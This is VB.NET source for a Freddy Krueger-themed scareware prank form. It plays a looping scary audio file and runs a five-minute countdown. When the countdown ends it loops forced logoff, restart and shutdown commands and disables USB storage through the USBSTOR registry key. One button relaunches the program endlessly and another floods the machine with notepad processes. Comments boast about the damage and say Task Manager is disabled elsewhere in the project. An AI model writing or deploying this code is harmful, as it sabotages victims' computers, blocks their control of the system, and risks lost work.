Imports System.IO
Imports Microsoft.Win32

Public Class Choice

    Private TargetDT As DateTime
    Private CountDownFrom As TimeSpan = TimeSpan.FromMinutes(5) ' The number 5 (to the left) will alter your time on the countdown

    Private Sub Choice_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        My.Computer.Audio.Play(My.Resources.fred, AudioPlayMode.BackgroundLoop) ' Go to https://lingojam.com/ScaryVoiceChanger to create a voice using your voice. Save as Wav//
        Timer1.Interval = 100
        TargetDT = DateTime.Now.Add(CountDownFrom)
        Timer1.Start()


    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim ts As TimeSpan = TargetDT.Subtract(DateTime.Now) 'Start of Timer1 Code>>>>
        If ts.TotalMilliseconds > 0 Then
            Label1.Text = ts.ToString("mm\:ss")
        Else
            Label1.Text = "00:00"
            Timer1.Stop() ' End of Timer1 Code>>>
            Do
                Shell("shutdown -l -t 450 ") 'Shutdown System in 10 seconds, so I set timer for 4:50///
                Dim regKey As RegistryKey
                regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
                regKey.SetValue("Start", 4)
            Loop

            Do
                Shell("shutdown -r -t 450 ") 'Shutdown System in 10 seconds, so I set timer for 4:50///
                Dim regKey As RegistryKey
                regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
                regKey.SetValue("Start", 4)
            Loop

            Do
                Shell("shutdown -s -t 450 ") 'Shutdown System in 10 seconds, so I set timer for 4:50///
                Dim regKey As RegistryKey
                regKey = Registry.LocalMachine.OpenSubKey("SYSTEM\CurrentControlSet\Services\USBSTOR", True)
                regKey.SetValue("Start", 4)
            Loop
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click 'Button 1///
        Dim proc As New System.Diagnostics.Process()         'This section can be used to open numerous processes\\\
        proc = Process.Start("http://www.freddykrueger.com/", "")  'YOU WILL NEED TO RESTART COMPUTER. EVEN IF YOU EXIT VISUAL STUDIOS, THE PROGRAM WILL STAY RUNNING DUE TO APPLICATION RESTART
        Application.Restart()  'Task Manager is disabled from the first form///

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click 'Button 2///
        Do
            Process.Start("notepad") ' This shoots out notepads/CMD,and Media Player faster then a machine gun spits bullets...You could add more processes just to be a dick.
        Loop                         ' I had to shutdown my computer quickly when I tested this, it was insane!!!!!
        Do
            Process.Start("cmd")
        Loop
        Do
            Process.Start("wmplayer")
        Loop

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click 'Exit Program///Door 3///Winning Button...Or is it????
        Application.Exit()  'Freddy Reanimator is forever///
    End Sub

End Class